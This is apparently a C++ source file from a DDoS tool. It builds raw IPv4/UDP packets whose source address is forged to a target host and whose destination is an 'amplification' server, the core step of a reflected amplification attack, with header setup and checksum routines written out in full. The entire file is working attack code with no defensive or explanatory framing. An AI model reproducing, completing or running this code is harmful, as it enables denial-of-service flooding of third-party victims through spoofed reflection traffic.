#include "Spoof.h"

static constexpr const size_t updhHdrSz = sizeof(udphdr);
static constexpr const size_t iphHdrSz = sizeof(iphdr);

uint16_t ip_csum(const uint16_t* buf, int count)
{
    unsigned long sum = 0;
    while (count > 1)
    {
        sum += *buf++;
        count -= 2;
    }
    if (count > 0)
        sum += *(unsigned char *)buf;
    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)(~sum);
}

uint16_t udp_csum(const udphdr * const udph, const size_t packetSz, const iphdr* const iph)
{
    const uint16_t *buf = (const uint16_t*) udph;
    uint16_t *ip_src = (uint16_t *) &(iph->saddr), *ip_dst = (uint16_t *) &(iph->daddr);

    uint32_t sum = 0;

    size_t len = updhHdrSz + packetSz;
    size_t length = len;


    while (len > 1)
    {
        sum += *buf++;

        if (sum & 0x80000000)
            sum = (sum & 0xFFFF) + (sum >> 16);

        len -= 2;
    }

    if (len & 1)
        sum += *((uint8_t *) buf);

    sum += *(ip_src++);
    sum += *ip_src;

    sum += *(ip_dst++);
    sum += *ip_dst;

    sum += htons(IPPROTO_UDP);
    sum += htons(length);

    while (sum >> 16)
    {
        sum = (sum & 0XFFFF) + (sum >> 16);
    }

    return (uint16_t) ~sum;
}

void setupIPheader(const char *const srcHost, const char *const dstHost, const size_t packetSz, iphdr *const iphOut)
{
    iphOut->ihl = 5;
    iphOut->version = 4;
    iphOut->tos = 0;
    iphOut->id = htons(1);
    iphOut->tot_len = iphHdrSz + updhHdrSz + packetSz;
    iphOut->frag_off = 0x40;
    iphOut->ttl = 64;
    iphOut->protocol = IPPROTO_UDP;

    iphOut->saddr = inet_addr(srcHost);
    iphOut->daddr = inet_addr(dstHost);
}

void setupUDPheader(const uint16_t srcPort, const uint16_t destPort, const size_t packetSz, udphdr *const udphOut)
{
    udphOut->source = htons(srcPort);
    udphOut->dest = htons(destPort);

    udphOut->len = htons(updhHdrSz + packetSz);
}

void insertDataPacket(char *const datagramBuff, const uint8_t *const packet, const size_t packetSz)
{
    memcpy(datagramBuff + iphHdrSz + updhHdrSz, packet, packetSz);
}

size_t buildSpoofPacket(char *const dataBuff, const ServeraAmplf &serverAmplf,
                        const char *const targetHost, const uint16_t targetPort, const size_t packetSz)
{

    iphdr *iph = (iphdr *)dataBuff;
    udphdr *udph = (udphdr *)((int8_t *)iph + iphHdrSz);

    // Setup protocols headers
    setupIPheader(targetHost, serverAmplf.host.c_str(), packetSz, iph);
    setupUDPheader(targetPort, serverAmplf.port, packetSz, udph);

    // Setup control summ
    iph->check = 0;
    iph->check = ip_csum((uint16_t*)dataBuff, iph->tot_len);

    udph->check = 0;
    udph->check = udp_csum(udph, packetSz, iph);
 
    return iph->tot_len;
}